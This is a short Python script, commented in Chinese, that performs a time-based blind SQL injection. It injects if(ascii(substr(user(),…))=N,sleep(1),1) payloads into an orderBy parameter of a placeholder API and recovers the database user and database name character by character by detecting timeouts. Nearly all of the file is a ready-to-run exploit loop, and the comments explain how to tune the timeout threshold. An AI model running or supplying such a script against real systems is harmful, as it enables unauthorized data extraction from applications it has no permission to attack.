#coding=utf-8
# 用burp跑貌似没找到字符对应ASCII的十进制的方法，而且即便直接导入ASCII的数值，也得反向查找。
# 时间盲注脚本：执行user(), database()函数
import requests

payload = 'abcdefghijklmnopqrstuvwxyz0123456789@_.{}-'

headers = {
    'Cookie': '',
    'Connection':'close',
}

# 1、先判断user()和database()的长度，然后逐位跑出来。
# orderBy=if(length(user())=10,sleep(1),1)
# orderBy=if(length(database())=17,sleep(1),1)

# 2、然后判断延时的秒数与sleep数值之间的倍数关系，如果sleep(1)，延时5s，则可以设置timeout为一个小于5的数。
# 当发现响应用时超过5s时，则认为条件为真，执行sleep成功，这样在异常处理中就可以将这次的字符串打印出来，然后累加到strings变量中。
# 最后当每位都跑完了的时候，就把strings打印出来，这样就拿到了结果。

strings = ''
# database_len = 10

# for i in range(1,database_len+1):
#     for y in payload:    # 使用ascii字符对database()的每一位进行枚举
#         url = "http://host:port/api/list?orderBy=if(ascii(substr(database(),{},1))={},sleep(1),1)".format(i,ord(y))
#         try:
#             response = requests.post(url,headers=headers,verify=False, timeout=3)
#         except Exception as e:    # 超时了就会到这里
#             strings  = strings + y
#             print(strings)
# print('[*] '+strings)


user_len= 17

# 变量i对应substr(user(),{},1)的第二个位置的参数，表示拿到user()这个结果字符串的第i位字符
# ord(y)是拿到某个字符的ASCII十进制数，与ascii()的结果格式对应
for i in range(1,user_len+1):
    for y in payload:    # 使用ascii字符对database()的每一位进行枚举
        url = "http://host:port/api/list?orderBy=if(ascii(substr(user(),{},1))={},sleep(1),1)".format(i,ord(y))
        try:
            response = requests.post(url,headers=headers,verify=False, timeout=3)
        except Exception as e:    # 超时了就会到这里
            strings  = strings + y
            print(strings)
print('[*] '+strings)
